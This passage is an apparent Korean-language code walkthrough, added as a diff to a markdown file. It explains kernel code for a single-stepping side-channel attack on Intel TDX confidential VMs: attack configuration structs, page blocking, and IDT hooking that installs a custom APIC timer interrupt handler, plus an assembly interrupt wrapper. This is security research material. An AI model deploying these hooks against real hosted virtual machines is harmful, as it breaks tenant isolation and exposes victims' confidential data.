@@ -270,9 +270,312 @@ typedef struct {
     //number of entries during the active attack phase
 	uint64_t entries_while_active_stepping_attack;
 ```
+`timer_value`는 TSC-Dealine 타이머에 쓸 오프셋으로, TD가 딱 한 명령어 실행할 시간 후에 인터럽트가 발생하도록 조정합니다. `entries~` 변수들은 싱글 스테핑이 실제로 몇 번 발동됐는지 추적하는 용도입니다.
 
+```c
+    apic_backup_t apic_backup;
+    attack_cfg_t attack_cfg;
+```
+APIC 레지스터 3개의 백업본과 공격 설정/결과 구조체입니다.
+
+```c
+    //set this flag if we supressed an interrupt during our stepping attack
+    bool suppressed_interrupt_during_stepping;
+	int suppressed_interrupt_delivery_mode;
+	int suppressed_interrupt_trig_mode;
+	int suppressed_interrupt_vector;
+```
+싱글 스테핑 중 외부 인터럽트가 들어오면 바로 TD에 전달하지 않고 억제했다가 공격이 끝난 후 재주입하는 부분입니다. `suppressed_interrupt_during_steping`이 true면 저장해둔 인터럽트 정보로 호출합니다.
+
+```c
+    struct page* pinned_page_shared_mem;
+    uint64_t* mapping_shared_mem; 
+    //might be 0, if feature not activated by user
+    uint8_t* mapping_victim_code;
+```
+`pinned_page_shared_mem`과 `mapping_shared_mem`은 더 큰 데이터를 주고 받기 위한 범용 공유 메모리 영역과 관련되어 있습니다. `mapping_victim_code`는 호스트 커널 공간에 매핑된 victim 프로그램의 바이너리 복사본으로, 공격자가 실행 중인 코드의 흐름을 재구성하기 위해 사용합니다.
+
+```c
+    //idt related vars
+
+    /// @brief core on which idt was retrieved or -1 if idt has never been fetched
+	int got_idt_on_cpu;
+	/// @brief if got_idt_on_cpu != -1, this holds the idt for that core
+	idt_t idt;
+    gate_desc_t old_idt_gate;
+    bool running_with_custom_apic_handler;
+```
+IDT 후킹과 관련된 부분입니다. x86 구조에서 IDT는 CPU 코어마다 별도로 존재하는데, `got_idt_on_cpu`는 공격이 실행되는 **특정 코어(VICTIM_CORE)의 IDT 주소** 를 가져와 어느 코어의 인터럽트 테이블을 조작하였는지 추적하는 변수입니다. `idt_t idt`, `gate_desc_t old_idt_gate`는 공격이 끝난 후 원래 사용하던 APIC 타이머 인터럽트 주소를 복원하는데 사용합니다. `running_with_custom_apic_handler`는 현재 시스템의 인터럽트 벡터가 공격용 핸들러에 연결되어 있는지 나타냅니다.
+
+```c
+    /* if this array is not null,
+     * access these tdvps pages directly before VM entry
+     * and again after VM exit
+    */
+    uint64_t* targeted_tdvps_addrs;
+    uint64_t targeted_tdvps_addrs_len;
+
+    uint64_t* all_tdvps_addrs;
+    uint64_t* timings_all_tdvps_addrs;
+    uint64_t all_tdvps_addrs_count;
+	//might be NULL if attack type not STUMBLE_STEP
+    volatile uint64_t* attacked_tdvps_addr;
+```
+`targeted_tdvps_addrs`는 **핵심 TDVPS 페이지들의 주소** 목록입니다. 다른 변수들은 TDVPS 페이지들 중 공격에 **적합한 페이지를 프로파일링** 하여 하나의 페이지만 골라낼 때 사용합니다. 
+
+```c
+    //Track if we have already called my_split_all_pages for this VM
+	bool called_split_pages;
+    fr_monitor_thread_ctx_t *fr_ctx;
+
+	//type of attack that should be performed
+	attack_type_t attack_type;
+} tdx_step_config_t;
+```
+`called_split_pages`는 가상화 환경에서 2MB, 1GB 크기의 대형 페이지를 4KB 단위의 작은 페이지로 쪼갰는지 여부를 나타내는 플래그로, 중복 작업을 피하기 위해 사용합니다. 
+
+```c
+extern spinlock_t tdx_step_config_lock;
+extern tdx_step_config_t tdx_step_config;
+extern atomic_t tdx_step_inside_vm;
+
+typedef enum {
+	BS_UNINIT,
+	BS_BLOCKED,
+	BS_ALLOWED,
+} tdx_step_block_status_t;
+```
+tdx_step_config가 동시에 수정되지 않도록 보호하고, `tdx_step_inside_vm`은 어떤 CPU 코어가 TDX 게스트 내부에서 실행 중인지 원자적으로 추적합니다. 
 
 #### arch/x86/kvm/tdx_step.c
+```c
+tdx_step_config_t tdx_step_config = {
+	.suppressed_interrupt_during_stepping = false,
+	.mapping_shared_mem = NULL,
+	.pinned_page_shared_mem = NULL,
+	.mapping_victim_code = NULL,
+	.running_with_custom_apic_handler = false,
+	.targeted_tdvps_addrs = NULL,
+	.attack_cfg = {
+		.state = AS_INACTIVE,
+		.debug_mode = false,
+		.event_id = 0,
+	},
+	.got_idt_on_cpu = - 1,
+	.fr_ctx = NULL,
+	.called_split_pages = false,
+};
+EXPORT_SYMBOL(tdx_step_config);
+```
+`tdx_step_config`에 실제 메모리를 할당하는 부분입니다. `.state=AS_INACTIVE`, `.got_idt_on_cpu=-1` 이런 부분에서 볼 수 있듯이 공격이 시작되기 전 깨끗한 상태로 설정합니다. 그 후 **EXPORT_SYMBOL** 을 이용하여 다른 커널 모듈에서 이 변수를 사용할 수 있도록 합니다.
+
+```c
+tdx_step_block_status_t *is_gfn_blocked = NULL;
+EXPORT_SYMBOL(is_gfn_blocked);
+
+uint64_t max_gfn_is_gfn_blocked = 0;
+EXPORT_SYMBOL(max_gfn_is_gfn_blocked);
+```
+GFN별 차단 상태를 저장하는 배열의 실제 정의입니다. GFN은 `Guest Frame Number`을 의미하며, `GFN = GPA >> 12`로 계산할 수 있습니다. 
+
+```c
+zap_unzap_fnptr_t my_tdx_sept_zap_private_spte_fnptr = NULL;
+EXPORT_SYMBOL(my_tdx_sept_zap_private_spte_fnptr);
+zap_unzap_fnptr_t my_tdx_sept_unzap_private_spte_fnptr = NULL;
+EXPORT_SYMBOL(my_tdx_sept_unzap_private_spte_fnptr);
+start_stop_track_all_fnptr_t kvm_start_tracking_fnptr = NULL;
+EXPORT_SYMBOL(kvm_start_tracking_fnptr);
+start_stop_track_all_fnptr_t kvm_stop_tracking_fnptr = NULL;
+EXPORT_SYMBOL(kvm_stop_tracking_fnptr);
+```
+SGX와 다르게 TDX에서는 공격자가 TD의 페이지 테이블에 직접 접근할 수가 없습니다. 함수 주소를 넣을 수 있는 변수를 정의하여 KVM이 실행될 때 주소를 변수에 넣어 실행할 수 있게 합니다.
+
+```c
+bool is_valid_is_gfn_blocked_index(uint64_t gfn)
+{
+	if (is_gfn_blocked == NULL) {
+		return false;
+	}
+	if ((gfn < 0) || (gfn > max_gfn_is_gfn_blocked)) {-
+		printk("%s out of bounds gfn 0x%llx\n", __FUNCTION__, gfn);
+		return false;
+	}
+	return true;
+}
+EXPORT_SYMBOL(is_valid_is_gfn_blocked_index);
+```
+전달받은 gfn 인덱스가 현재 할당된 메모리 범위 내에 있는지 확인하는 함수입니다. 
+
+```c
+bool is_gfn_allowed_or_uninit(uint64_t gfn)
+{
+	if (is_gfn_blocked == NULL) {
+		return true;
+	}
+	if ((gfn < 0) || (gfn > max_gfn_is_gfn_blocked)) {
+		printk("%s out of bounds gfn 0x%llx\n", __FUNCTION__, gfn);
+		return true;
+	}
+	return (is_gfn_blocked[gfn] == BS_UNINIT ||
+		is_gfn_blocked[gfn] == BS_ALLOWED);
+}
+EXPORT_SYMBOL(is_gfn_allowed_or_uninit);
+```
+특정 GFN이 주어질 때, 페이지를 지금 차단해도 되는 상태인지 판별하는 함수입니다. **is_gfn_blocked[gfn]이 BS_BLOCKED** 일 때 false를 반환합니다. 
+
+```c
+//
+// Interfacing with IDT to install custom APIC Interrupt Handler
+//
+
+
+idt_t idt;
+#define CUSTOM_APIC_IRQ_NUMBER 45
+#define STOCK_APIC_IRQ_NUMBER 0xec
+extern void isr_wrapper(void);
+```
+커스텀 APIC 인터럽트 핸들러를 설치하는 과정입니다. `idt_t idt`는 IDT의 사본으로, 이 구조체에 현재 CPU의 원본 IDT를 복사한 다음, 특정 번호의 주소만 **공격자 전용 핸들러 주소** 로 후킹하기 위해 사용합니다. 공격자는 **45번 번호** 에 `freq-sneak` 핸들러를 연결하여 APIC 타이머 인터럽트가 발생할 때 바로 **isr_wrapper** 로 점프하게 합니다. 기존 커널이 사용하던 `0xec`는 저장해두고, 공격이 끝난 후 복구합니다. **isr_wrapper** 함수는 어셈블리로 구성된 인터럽트 서비스 루틴의 진입점으로 **하드웨어 -> 어셈블리 -> C 함수** 로 이어집니다.
+
+```c
+/**
+ * @brief Get the current idt. This is core specific and must be called with interrupts enabled
+ * 
+ * @param config The retrieved idt is stored here together with the core for which it is valid
+ */
+void my_idt_init_idt( tdx_step_config_t *config ) {
+	dtr_t idtr = {0};
+	int entries;
+
+	if ( config->got_idt_on_cpu == smp_processor_id() ) {
+		return;
+	}
+	printk("%s : running on core: %d\n", __FUNCTION__, smp_processor_id());
+
+	asm volatile ("sidt %0\n\t" :"=m"(idtr) :: );
+
+	entries = (idtr.size+1)/sizeof(gate_desc_t);
+	if(idtr.base == 0 ) {
+		printk("%s : idtr.base is NULL, aborting\n", __FUNCTION__);
+		return;
+	}
+
+	set_memory_rw(idtr.base,1);
+
+	config->idt.base = (gate_desc_t*) idtr.base;
+	config->idt.entries = entries;
+	config->got_idt_on_cpu = smp_processor_id();
+}
+EXPORT_SYMBOL(my_idt_init_idt);
+```
+현재 CPU가 사용 중인 IDT 위치를 가져온 후, 커널 함수를 호출하여 해당 메모리 영역을 **읽기, 쓰기 가능** 상태로 전환하는 함수입니다. 그 후 현재 코드가 실행 중인 코어 정보를 등록합니다. 
+
+```c
+/**
+ * @brief Install new irq handler
+ * 
+ * @param config global sev step config
+ * @param asm_handler custom handler from asm
+ * @param vector vector for handler
+ */
+void install_kernel_irq_handler(tdx_step_config_t *config, void *asm_handler, int vector) {
+	gate_desc_t *gate;
+
+	BUG_ON(config->got_idt_on_cpu != smp_processor_id());
+
+    gate = gate_ptr(config->idt.base, vector);
+	//printk("old gate:\n");
+	//dump_gate(gate,vector);
+	//store old entry
+	memcpy(&config->old_idt_gate, gate, sizeof(gate_desc_t));
+
+
+    gate->offset_low    = PTR_LOW(asm_handler);
+    gate->offset_middle = PTR_MIDDLE(asm_handler);
+    gate->offset_high   = PTR_HIGH(asm_handler);
+    
+    gate->p = 1; //segment present flag
+    gate->segment = KERNEL_CS; //segment selector
+    gate->dpl = KERNEL_DPL; //descriptor privilege lvel
+    gate->type = GATE_INTERRUPT; //type
+    gate->ist = 0; // new stack for interrupt handling?
+}
+```
+커스텀 핸들러를 IDT에 직접 설치하는 함수입니다. memcpy 함수에서 기존 핸들러 엔트리를 백업해두고, 이 후 복원에 사용합니다. 그 후 커스텀 핸들러 주소를 IDT 게이트 디스크립터 포맷에 맞게 IDT 엔트리에 넣어줍니다. 
+
+```c
+/**
+ * @brief Restore the old irq handler
+ * 
+ * @param config global sev step config
+ * @param vector vector for handler
+ */
+static void restore_kernel_irq_handler(tdx_step_config_t *config, int vector) {
+	gate_desc_t *gate;
+
+	BUG_ON(config->got_idt_on_cpu != smp_processor_id());
+
+
+    gate = gate_ptr(config->idt.base, vector);
+	memcpy(gate,&config->old_idt_gate, sizeof(gate_desc_t));
+}
+```
+백업해두었던 `old_idt_gate`를 백터 45번 IDT 슬롯에 그대로 복원하는 함수입니다. 공격이 끝난 후 커스텀 핸들러를 제거할 때 호출됩니다.
+
+```c
+//this function is called from asm
+void my_handler(void) {
+	//printk("my_handler: got called\n");
+	apic_write(APIC_EOI, 0x0); //aknowledge interrupt
+}
+```
+APIC한테 **인터럽트 처리 완료** 를 알리는 함수입니다. EOI는 `End Of Interrupt`를 의미합니다. 인터럽트의 목적은 TDEXIT을 트리거하는 것이지, 뭔가를 처리하는게 아니라 바로 핸들러가 APIC 정리를 하면 됩니다. 
+
+#### arch/x86/kvm/isr_wrapper.S
+```nasm
+    .text
+    .global isr_wrapper
+    .type isr_wrapper,@function
+isr_wrapper:
+    //rdtsc
+    //mov %eax, nemesis_tsc_aex(%rip)
+
+    /* HACK: restore edx:eax from AEX synthetic register state */
+    //mov $3, %rax
+    //mov $0, %rdx
+
+    pushq %rax
+    movq %rsp, %rax
+    add $8,%rax
+    pushq %rbx
+    pushq %rcx
+    pushq %rdx
+    pushq %rbp
+    pushq %rsi
+    pushq %rdi
+    pushq %r8
+    pushq %r9
+    pushq %r10
+    pushq %r11
+
+    movq %rax, %rdi
+    /* TODO support 256 possible IRQ handlers via asm macro */
+    //movb sgx_step_vector_hack(%rip), %sil
+    call my_handler
+
+    popq %r11
+    popq %r10
+    popq %r9
+    popq %r8
+    popq %rdi
+    popq %rsi
+    popq %rbp
+    popq %rdx
+    popq %rcx
+    popq %rbx
+    popq %rax
+    iretq
+```
+인터럽트 핸들러는 레지스터를 사용하기 때문에 모두 저장해두었다가 보존해야 `iretq` 후 원래 실행 흐름이 깨지지 않습니다. 
 
 ### 커널 패치
 #### arch/x86/virt/vmx/tdx/tdxcall.S
